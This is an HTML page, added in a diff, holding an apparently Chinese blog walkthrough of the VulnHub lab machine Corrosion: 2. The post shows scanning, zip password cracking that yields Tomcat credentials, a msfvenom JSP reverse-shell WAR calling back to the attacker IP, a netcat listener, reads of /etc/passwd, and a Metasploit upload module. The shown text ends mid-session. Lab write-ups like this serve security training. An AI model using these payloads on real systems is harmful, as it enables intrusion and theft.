@@ -1,0 +1,563 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>Corrosion：2 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Corrosion：2">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-06-30 00:00" pubdate>
+        2022年6月30日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      56
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Corrosion：2</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x0E-Corrosion-2-vulnhub"><a href="#0x0E-Corrosion-2-vulnhub" class="headerlink" title="0x0E Corrosion: 2~vulnhub"></a>0x0E Corrosion: 2~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/corrosion-2,745/">Corrosion: 2 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.150</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.150</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.150</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-30 04:13 EDT<br>Nmap scan report for 192.168.135.150<br>Host is up (0.00038s latency).<br>Not shown: 65532 closed ports<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)<br>|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)<br>|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>8080/tcp open  http    Apache Tomcat 9.0.53<br>|_http-favicon: Apache Tomcat<br>|_http-title: Apache Tomcat/9.0.53<br>MAC Address: 00:0C:29:B4:39:BC (VMware)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.38 ms 192.168.135.150<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds <br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Apache httpd 2.4.41 ((Ubuntu))</td>
+</tr>
+<tr>
+<td>8080/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Apache Tomcat 9.0.53</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p>
+<p><strong>80端口</strong></p>
+<p>进行目录扫描无果 。</p>
+<p><strong>8080端口</strong></p>
+<p>进行目录扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.150:8080</span><br><br>Target: http://192.168.135.150:8080/<br><br>[05:01:04] Starting:                            <br>[05:01:31] 200 -   33KB - /backup.zip                                       <br>[05:01:39] 200 -   15KB - /docs/                                                                           <br>[05:01:40] 200 -    1KB - /examples/                                        <br>[05:01:40] 200 -    6KB - /examples/servlets/index.html  <br>[05:01:41] 200 -   21KB - /favicon.ico                                      <br>[05:01:42] 200 -  686B  - /examples/jsp/snp/snoop.jsp<br>[05:01:45] 200 -   11KB - /index.jsp                               <br>[05:01:45] 401 -    2KB - /manager/html<br>[05:02:00] 200 -  153B  - /readme.txt  <br><br>Task Completed     <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.150:8080/ -X .php,.jsp,.zip,.txt</span><br><br>URL_BASE: http://192.168.135.150:8080/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>EXTENSIONS_LIST: (.php,.jsp,.zip,.txt) | (.php)(.jsp)(.zip)(.txt) [NUM = 4]<br><br>---- Scanning URL: http://192.168.135.150:8080/ ----<br>+ http://192.168.135.150:8080/backup.zip (CODE:200|SIZE:33723)<br>+ http://192.168.135.150:8080/index.jsp (CODE:200|SIZE:11136)<br>+ http://192.168.135.150:8080/readme.txt (CODE:200|SIZE:153)   <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.150:8080</span>                           <br>- Nikto v2.1.6<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.135.150<br>+ Target Hostname:    192.168.135.150<br>+ Target Port:        8080<br>+ Start Time:         2022-07-01 03:47:20 (GMT-4)<br>---------------------------------------------------------------------------<br>+ OSVDB-39272: <br>+ /backup.zip: Potentially interesting archive/cert file found.<br>+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).<br>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS <br>+ OSVDB-397: HTTP method (&#x27;Allow&#x27; Header): &#x27;PUT&#x27; method could allow clients to save files on the web server.<br>+ OSVDB-5646: HTTP method (&#x27;Allow&#x27; Header): &#x27;DELETE&#x27; may allow clients to remove files on the web server.<br>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.<br>+ OSVDB-3092: /readme.txt: This might be interesting...<br>+ /manager/html: Default Tomcat Manager / Host Manager interface found<br>+ /host-manager/html: Default Tomcat Manager / Host Manager interface found<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>
+<p>得到两个重要文件：<code>/backup.zip</code> 和 <code>/readme.txt</code></p>
+<p>访问 <code>http://192.168.135.150:8080/readme.txt</code> ，得到提示：</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Hey randy! It<span class="hljs-comment">&#x27;s your System Administrator. I left you a file on the server, I&#x27;m sure nobody will find it.</span><br>Also remember <span class="hljs-keyword">to</span> use that password I gave you.<br></code></pre></td></tr></table></figure>
+<p>访问 <code>http://192.168.135.150:8080/backup.zip</code> ，下载下来一个压缩包，是配置信息，但需要密码，对压缩包进行破解。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.150:8080/backup.zip</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> John</span><br><span class="hljs-meta">$</span><span class="bash"> zip2john backup.zip &gt; passwd.txt; john passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br>[......]<br>@administrator_hi5 (backup.zip)<br>[......]<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> fcrackzip/rarcrack/Python(zipfile)</span><br><span class="hljs-meta">$</span><span class="bash"> fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip</span><br></code></pre></td></tr></table></figure>
+<p>解压文件，对文件进行查看：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unzip -P @administrator_hi5 -q backup.zip -d ./backup</span><br></code></pre></td></tr></table></figure>
+<p>在 <code>tomcat-users.xml</code> 中找到两个用户名和密码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tomcat-users</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;manager&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;melehifokivai&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;admin-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;melehifokivai&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;admin-gui, manager-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tomcat-users</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><h3 id="M1、Upload"><a href="#M1、Upload" class="headerlink" title="M1、Upload"></a>M1、Upload</h3><p>在 <code>http://192.168.135.150:8080/manager/html</code> 中发现一个可以上传 war 文件的地方，尝试上传木马。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.135.141 LPORT=4444 -f war &gt; shell.war</span><br></code></pre></td></tr></table></figure>
+<p>使用 admin 上传失败：</p>
+<blockquote>
+<p>后来再次使用 admin 上传居然成功了，不知道什么原因</p>
+</blockquote>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-number">403</span> <span class="hljs-keyword">Access</span> Denied<br>You are <span class="hljs-keyword">not</span> authorized <span class="hljs-keyword">to</span> <span class="hljs-keyword">view</span> this page.<br><br>By <span class="hljs-keyword">default</span> the Manager <span class="hljs-keyword">is</span> only accessible from a browser running <span class="hljs-keyword">on</span> the same machine as Tomcat. <span class="hljs-keyword">If</span> you wish <span class="hljs-keyword">to</span> modify this restriction, you<span class="hljs-symbol">&#x27;ll</span> need <span class="hljs-keyword">to</span> edit the Manager<span class="hljs-symbol">&#x27;s</span> <span class="hljs-keyword">context</span>.xml <span class="hljs-keyword">file</span>.<br><br>[......]<br><br><span class="hljs-keyword">If</span> you have <span class="hljs-keyword">not</span> changed any <span class="hljs-keyword">configuration</span> files, please examine the <span class="hljs-keyword">file</span> conf/tomcat-users.xml <span class="hljs-keyword">in</span> your installation. That <span class="hljs-keyword">file</span> must contain the credentials <span class="hljs-keyword">to</span> let you <span class="hljs-keyword">use</span> this webapp.<br><br><span class="hljs-keyword">For</span> example, <span class="hljs-keyword">to</span> add the manager-gui role <span class="hljs-keyword">to</span> a user named tomcat <span class="hljs-keyword">with</span> a password <span class="hljs-keyword">of</span> s3cret, add the following <span class="hljs-keyword">to</span> the config <span class="hljs-keyword">file</span> listed above.<br><br>&lt;role rolename=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;<br>&lt;user username=<span class="hljs-string">&quot;tomcat&quot;</span> password=<span class="hljs-string">&quot;s3cret&quot;</span> roles=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;<br><br>[......]<br></code></pre></td></tr></table></figure>
+<p>使用 manager 尝试，成功上传，访问出现 404 ，将文件名字修改为 wzz.war，成功上传并访问 。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">HTTP Status <span class="hljs-number">404</span> – <span class="hljs-keyword">Not</span> <span class="hljs-built_in">Found</span><br><span class="hljs-keyword">Type</span> Status Report<br><br>Message JSP file [/ozmptmhkzfd.jsp] <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span><br><br>Description The origin <span class="hljs-keyword">server</span> did <span class="hljs-keyword">not</span> find a <span class="hljs-keyword">current</span> representation <span class="hljs-keyword">for</span> the target resource <span class="hljs-keyword">or</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> willing <span class="hljs-keyword">to</span> disclose that one <span class="hljs-keyword">exists</span>.<br><br>Apache Tomcat/<span class="hljs-number">9.0</span><span class="hljs-number">.53</span><br></code></pre></td></tr></table></figure>
+<p>监听，访问 <code>http://192.168.135.150:8080/wzz/</code> ，成功反弹：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>            <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.150] 52036<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>tomcat<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)<br></code></pre></td></tr></table></figure>
+<p>查看 <code>/etc/passwd</code> ，得到另外两个用户：<code>jaye</code> 和 <code>randy</code> ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>[......]<br>randy:x:1000:1000:randy,,,:/home/randy:/bin/bash<br>tomcat:x:1001:1001::/home/tomcat:/bin/sh<br>jaye:x:1002:1002::/home/jaye:/bin/sh<br></code></pre></td></tr></table></figure>
+<p>查看文件，得到 flag 和提示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls /home</span><br>jaye<br>randy<br><span class="hljs-meta">$</span><span class="bash"> ls /home/jaye</span><br><span class="hljs-meta">$</span><span class="bash"> ls /home/randy</span><br>Desktop<br>Documents<br>Downloads<br>Music<br>note.txt<br>Pictures<br>Public<br>randombase64.py<br>Templates<br>user.txt<br>Videos<br><span class="hljs-meta">$</span><span class="bash"> cat /home/randy/user.txt</span><br>ca73a018ae6908a7d0ea5d1c269ba4b6<br><span class="hljs-meta">$</span><span class="bash"> cat /home/randy/note.txt</span><br>Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know<br>that I changed your permissions for your home directory. You won&#x27;t be able to remove or add files for now.<br>I will change these permissions later on.<br>See you next Monday randy!<br></code></pre></td></tr></table></figure>
+<h3 id="M2、MSF"><a href="#M2、MSF" class="headerlink" title="M2、MSF"></a>M2、MSF</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use exploit/multi/http/tomcat_mgr_upload<br>[*] No payload configured, defaulting to java/meterpreter/reverse_tcp<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; show options<br><br>Module options (exploit/multi/http/tomcat_mgr_upload):<br><br>   Name          Current Setting  Required  Description<br>   ----          ---------------  --------  -----------<br>   HttpPassword                   no        The password for the specified username<br>   HttpUsername                   no        The username to authenticate as<br>   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT         80               yes       The target port (TCP)<br>   SSL           false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)<br>   VHOST                          no        HTTP server virtual host<br><br><br>Payload options (java/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Java Universal<br><br><br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RHOST 192.168.135.150<br>RHOST =&gt; 192.168.135.150<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RPORT 8080<br>RPORT =&gt; 8080<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername manager<br>HttpUsername =&gt; manager<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword melehifokivai<br>HttpPassword =&gt; melehifokivai<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; run<br><br>[-] Exploit aborted due to failure: not-found: The target server fingerprint &quot;&quot; does not match &quot;(?-mix:Apache.*(Coyote|Tomcat))&quot;, use &#x27;set FingerprintCheck false&#x27; to disable this check.<br>[*] Exploit completed, but no session was created.<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set FingerprintCheck false<br>FingerprintCheck =&gt; false<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; 